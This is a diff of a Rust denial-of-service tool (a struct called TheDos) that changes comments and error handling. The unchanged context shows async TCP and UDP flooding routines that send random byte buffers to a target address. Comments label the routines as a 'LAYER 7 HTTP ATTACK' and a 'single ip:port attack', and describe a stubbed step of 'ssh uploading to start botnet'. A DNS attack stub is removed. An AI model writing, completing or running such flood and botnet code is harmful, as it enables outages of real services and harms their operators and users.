@@ -92,7 +92,7 @@ impl TheDos{
             n_workers 
         } = self; // unpacking self into a new struct
         
-        // ssh uploading
+        // ssh uploading to start botnet
         todo!()
     
     }
@@ -220,9 +220,9 @@ impl TheDos{
 
 
     
-    /////////////////////////////////////////////////////////////////////////////
-    //////////////////////////////// HTTP ATTACK ////////////////////////////////
-    /////////////////////////////////////////////////////////////////////////////
+    /////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////// LAYER 7 HTTP ATTACK ////////////////////////////////
+    /////////////////////////////////////////////////////////////////////////////////////
 
     pub async fn httpcall(&mut self){ // url is &str thus we don't need to clone it since its sized
         
@@ -255,7 +255,7 @@ impl TheDos{
 
         let mut time = self.retries;
         let workers = self.n_workers; // making a new lifetime for the workers
-        let tcp_addr = self.tcp_addr.clone().unwrap(); // if we are here we are sure that we have a tcp address from the passed in cli arg
+        let tcp_addr = self.tcp_addr.clone().unwrap(); // if we are here we are sure that we have a tcp address from the passed in cli arg - single ip:port attack
 
         time+=1;
         tokio::spawn(async move{ // we can't use self inside the tokio::spawn() body since self is a reference that is only valid in the associated function body 
@@ -267,9 +267,7 @@ impl TheDos{
                     stream.write_all(&random_bytes).await.unwrap(); // sending buffer to the target host 
 
                 },
-                Err(e) => {
-                    eprintln!(": {} at {}", e, chrono::Local::now());
-                }
+                Err(e) => eprintln!(": {} at {}", e, chrono::Local::now()),
             }
         });  
         
@@ -302,29 +300,13 @@ impl TheDos{
                     socket.send(&random_bytes).await.unwrap(); // send to the remote address that this socket is connected to or we can send to another address 
 
                 },
-                Err(e) => {
-                    eprintln!(": {} at {}", e, chrono::Local::now());
-                }
+                Err(e) => eprintln!(": {} at {}", e, chrono::Local::now()),
             }
         });
              
         self.retries = time;
 
     }
-
-
-
-    ////////////////////////////////////////////////////////////////////////////
-    //////////////////////////////// DNS ATTACK ////////////////////////////////
-    ////////////////////////////////////////////////////////////////////////////
-    
-    pub async fn dnscall(&mut self){
-        
-        // modify dns packets
-        // iptables o ina
-        todo!();
-    }
-
 
 }
 
